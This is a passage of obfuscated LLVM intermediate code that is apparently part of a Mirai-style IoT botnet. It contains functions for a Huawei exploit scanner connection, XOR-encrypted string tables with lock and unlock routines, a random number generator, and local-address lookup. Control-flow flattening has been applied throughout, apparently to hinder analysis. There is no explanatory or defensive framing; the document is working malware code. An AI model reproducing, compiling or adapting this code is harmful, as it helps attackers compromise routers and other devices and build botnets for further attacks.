  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %26, i32 0, i32 6
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i32 0, i32 0
  call void @util_zero(i8* %28, i32 256)
  %29 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %30 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %29, i32 0, i32 0
  %31 = load i32, i32* %30, align 8
  %32 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %33 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 8
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %34, i32 3, i32 0)
  %36 = or i32 2048, %35
  %37 = call i32 (i32, i32, ...) @fcntl(i32 %31, i32 4, i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %38, align 4
  %39 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %39, i32 0, i32 3
  %41 = load i32, i32* %40, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %45 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %44, i32 0, i32 4
  %46 = load i16, i16* %45, align 8
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* @huawei_fake_time, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 1
  store i32 %48, i32* %50, align 4
  %51 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %51, i32 0, i32 2
  %53 = load i32, i32* %52, align 8
  %54 = icmp eq i32 %53, 3
  %55 = select i1 %54, i32 495083670, i32 737543257
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %57, i32 0, i32 2
  %59 = load i32, i32* %58, align 8
  %60 = icmp eq i32 %59, 4
  %61 = select i1 %60, i32 495083670, i32 -1444858311
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 -98136737, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %64, i32 0, i32 2
  store i32 1, i32* %65, align 8
  store i32 -98136737, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %68 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %67, i32 0, i32 0
  %69 = load i32, i32* %68, align 8
  %70 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %71 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %71, %struct.sockaddr** %70, align 8
  %72 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %73 = load %struct.sockaddr*, %struct.sockaddr** %72, align 8
  %74 = call i32 @connect(i32 %69, %struct.sockaddr* %73, i32 16)
  store i32 1578062767, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %66, %63, %62, %56, %23, %22, %16, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1448321160, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1448321160, label %first
    i32 589480380, label %21
    i32 -1063899983, label %22
    i32 388072122, label %27
    i32 1389555547, label %36
    i32 -76000899, label %41
    i32 -139184661, label %42
    i32 1021147543, label %45
    i32 -1490533586, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %19 = icmp sgt i32 %.reload, 0
  %20 = select i1 %19, i32 589480380, i32 -1490533586
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  store i32 -1063899983, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %10, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 388072122, i32 1021147543
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  %35 = select i1 %34, i32 1389555547, i32 -76000899
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i32, i32* %10, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  store i8 65, i8* %40, align 1
  store i32 -76000899, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 -139184661, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %10, align 4
  store i32 -1063899983, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1490533586, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  ret i32 %47

loopEnd:                                          ; preds = %45, %42, %41, %36, %27, %22, %21, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #6
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #6
  %4 = call i32 @getppid() #6
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #6
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i64 @clock() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() #0 {
  call void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i32 0, i32 0), i32 14)
  call void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i32 0, i32 0), i32 19)
  call void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i32 0, i32 0), i32 23)
  call void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i32 0, i32 0), i32 24)
  call void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i32 0, i32 0), i32 15)
  call void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i32 0, i32 0), i32 22)
  call void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i32 0, i32 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_entry(i8 zeroext, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i8 %0, i8* %4, align 1
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load i32, i32* %6, align 4
  %9 = sext i32 %8 to i64
  %10 = call noalias i8* @malloc(i64 %9) #6
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %11, i8* %12, i32 %13)
  %14 = load i8*, i8** %7, align 8
  %15 = load i8, i8* %4, align 1
  %16 = zext i8 %15 to i64
  %17 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.table_value, %struct.table_value* %17, i32 0, i32 0
  store i8* %14, i8** %18, align 16
  %19 = load i32, i32* %6, align 4
  %20 = trunc i32 %19 to i16
  %21 = load i8, i8* %4, align 1
  %22 = zext i8 %21 to i64
  %23 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %22
  %24 = getelementptr inbounds %struct.table_value, %struct.table_value* %23, i32 0, i32 1
  store i16 %20, i16* %24, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1341620103, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1341620103, label %27
    i32 -116633215, label %35
    i32 632506142, label %84
    i32 -1781459958, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 -116633215, i32 -1781459958
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 632506142, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 1341620103, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1105170658, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1105170658, label %first
    i32 348583612, label %12
    i32 215337558, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 348583612, i32 215337558
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 215337558, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1696297677, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1696297677, label %4
    i32 1146365573, label %11
    i32 75618815, label %14
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  %10 = select i1 %9, i32 1146365573, i32 75618815
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* %3, align 4
  store i32 1696297677, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  ret i32 %15

loopEnd:                                          ; preds = %11, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  %switchVar = alloca i32
  store i32 207841947, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 207841947, label %11
    i32 424955499, label %16
    i32 1601934759, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  %15 = select i1 %14, i32 424955499, i32 1601934759
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %8, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %8, align 8
  %19 = load i8, i8* %17, align 1
  %20 = load i8*, i8** %7, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %7, align 8
  store i8 %19, i8* %20, align 1
  store i32 207841947, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  %switchVar = alloca i32
  store i32 210900846, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 210900846, label %7
    i32 520210101, label %12
    i32 514258402, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  %11 = select i1 %10, i32 520210101, i32 514258402
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %5, align 8
  store i8 0, i8* %13, align 1
  store i32 210900846, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %12, %7, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #9
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %8, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %2, align 4
  %switchVar = alloca i32
  store i32 283889319, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 283889319, label %first
    i32 1986873973, label %11
    i32 -1776604309, label %12
    i32 1408443796, label %36
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp eq i32 %.reload, -1
  %10 = select i1 %9, i32 1986873973, i32 -1776604309
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1408443796, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = call i32 @htonl(i32 134744072) #9
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = call zeroext i16 @htons(i16 zeroext 53) #9
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = load i32, i32* %2, align 4
  %20 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %21 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %21, %struct.sockaddr** %20, align 8
  %22 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %23 = load %struct.sockaddr*, %struct.sockaddr** %22, align 8
  %24 = call i32 @connect(i32 %19, %struct.sockaddr* %23, i32 16)
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %27 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %27, %struct.sockaddr** %26, align 8
  %28 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %29 = load %struct.sockaddr*, %struct.sockaddr** %28, align 8
  %30 = call i32 @getsockname(i32 %25, %struct.sockaddr* %29, i32* %4) #6
  %31 = load i32, i32* %2, align 4
  %32 = call i32 @close(i32 %31)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %34 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 4
  store i32 %35, i32* %1, align 4
  store i32 1408443796, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %1, align 4
  ret i32 %37

loopEnd:                                          ; preds = %12, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
